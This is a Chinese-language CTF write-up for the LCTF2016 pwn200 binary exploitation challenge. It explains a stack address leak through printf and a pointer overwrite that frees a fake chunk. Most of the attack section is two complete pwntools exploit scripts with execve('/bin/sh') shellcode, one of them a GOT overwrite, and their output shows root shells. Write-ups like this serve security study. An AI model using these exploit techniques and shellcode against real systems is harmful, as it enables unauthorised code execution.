---
layout: post
title: pwn LCTF2016 pwn200
excerpt: "LCTF2016 pwn200 wirteup"
categories: [PWN writeup]
comments: true
---

checksec
```python
python
Python 2.7.5 (default, Aug  7 2019, 00:51:29) 
[GCC 4.8.5 20150623 (Red Hat 4.8.5-39)] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> print ELF('pwn200').checksec()
[*] '/root/tw_pwn_code/ctf_collection/LCTF2016/pwn200'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
ida64中查看
```
int whoareyou()
{
  signed __int64 i; // [sp+10h] [bp-40h]@1
  char v2[48]; // [sp+20h] [bp-30h]@2

  puts("who are u?");
  for ( i = 0LL; i <= 47; ++i )
  {
    read(0, &v2[i], 1uLL);
    if ( v2[i] == 10 )
    {
      v2[i] = 0;
      break;
    }
  }
  printf("%s, welcome to xdctf~\n", v2);
  puts("give me your id ~~?");
  read_num_morty();
  return givememoney();
}
```
v2位于rbp-0x30的位置，而name会读入0x30个字符，且如果读入0x30个字符的话末尾不会有\x00，这样在printf的时候就会顺带leak出rbp的值

**printf会输出数据直到\x00**

```
int sub_400A29()
{
  char *v0; // rdi@1
  char buf; // [sp+0h] [bp-40h]@1
  char *dest; // [sp+38h] [bp-8h]@1

  dest = (char *)malloc(0x40uLL);
  puts("give me money~");
  read(0, &buf, 0x40uLL);
  v0 = dest;
  strcpy(dest, &buf);
  ptr = dest;
  return sub_4009C4(v0, &buf);
}
```
- buf在栈上的位置是rbp-0x40，dest在栈上的位置是rbp-0x8，但是buf却读了0x40个字节，很明显最后八字节会将dest的块的地址覆盖
- strcpy遇到\x00停止

checkout的时候free了ptr
```c
void checkout()
{
  if ( ptr )
  {
    puts("out~");
    free(ptr);
    ptr = 0LL;
  }
  else
  {
    puts("havn't check in");
  }
}
```
我们可以在`sub_400A29`的时候控制ptr,将prt指向一个假的chunk中

先leak出rbp的地址
用money构造fake chunk，然后再用id字段构造next chunk的size，此时money与id之间保存的内容包括了当前调用空间的rbp以及ret address
将dest的地址覆盖成fake chunk的地址，然后用check out函数将其free
再check in同样的size，然后往栈中构造shellcode，再将ret address覆盖成payload的地址
或者也可以在第一次输入money的时候就输入payload，但是要注意控制好长度，不然会因为strcpy将已经覆盖好的dest再覆盖成shellcode


最终的exp
```python
from pwn import *

#context.log_level = 'debug'

p = process('./pwn200')
#p = remote('119.28.63.211',2333)

p.recvuntil('who are u?')

addr_got_plt = 0x0000000000602000
shellocde = "\x90\x90\x90\x90"
shellocde +="\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"
#name="A"*48 
name = shellocde + "A"*(48-len(shellocde))

raw_input('$debug1')
p.send(name)
junk = p.recvuntil('A'*(48-len(shellocde)))
leak_addr = p.recv(6)
print "leak--->0x" + (leak_addr or ' ')[::-1].encode('hex')
leak_addr = (leak_addr or ' ')[::-1].encode('hex')
leak_addr = int(leak_addr,16)
#print type(leak_addr)
offset = 0x50
target_addr = leak_addr - offset

pl = "B"*25 + p64(target_addr)
pl += "A" * (0x40 - len(pl) - len(p64(addr_got_plt)) + 1)
pl += p64(addr_got_plt + 24)

raw_input('$debug2')
p.sendline(pl)

p.interactive()
```
运行结果
```
python pwn200exp.py 
[+] Starting local process './pwn200': pid 23629
$debug1
leak--->0x7fffffffe2f0
$debug2
[*] Switching to interactive mode
, welcome to xdctf~
give me your id ~~?
0x42 give me money~
$ id
uid=0(root) gid=0(root) groups=0(root)
```

```
0x400a9b:	call   0x400630 <puts@plt>

0x400b0b:	call   0x400640 <printf@plt>

0x400610 <free@plt>:	jmp    QWORD PTR [rip+0x201a02]        # 0x602018 <free@got.plt>

mov    QWORD PTR [rip+0x201616],rax        # 0x602098

mov   0x602091			0x602018


shellcode_addr = 0x7fffffffe220

应该是 cpy  [freegot]([0x602018]) , 0x7fffffffe220
```
另一种思路的exp
```python
from pwn import *

#context.log_level = 'debug'

p = process('./pwn200')
p.recvuntil('who are u?')
elf = ELF('./pwn200')
free_got = elf.got["free"]
shellocde= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
name = shellocde + "A"*(48-len(shellocde))

raw_input('#1')
p.send(name)
junk = p.recvuntil('A'*(48-len(shellocde)))
leak_addr = p.recv(6)
print "leak--->0x" + (leak_addr or ' ')[::-1].encode('hex')
leak_addr = (leak_addr or ' ')[::-1].encode('hex')
leak_addr = int(leak_addr,16)
#print type(leak_addr)
offset = 0x50
shellcode_addr = leak_addr - offset         #获取shellcode的地址
p.sendline('0')  # id
p.recvuntil('\n')

payload = p64(shellcode_addr)
p.send(payload + '\x00' * (0x38 - len(payload)) + p64(free_got))  # the juck data must be '\x00' in the got!
p.recvuntil('choice :')
p.sendline('2')
p.interactive()

```
结果
```
python pwn200exp2.py 
[+] Starting local process './pwn200': pid 306
[*] '/root/tw_pwn_code/ctf_collection/LCTF2016/pwn200'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
#1
leak--->0x7fffffffe2f0
shellcode_addr = 0x7fffffffe2a0
[*] Switching to interactive mode
 out~
$ id
uid=0(root) gid=0(root) groups=0(root)
```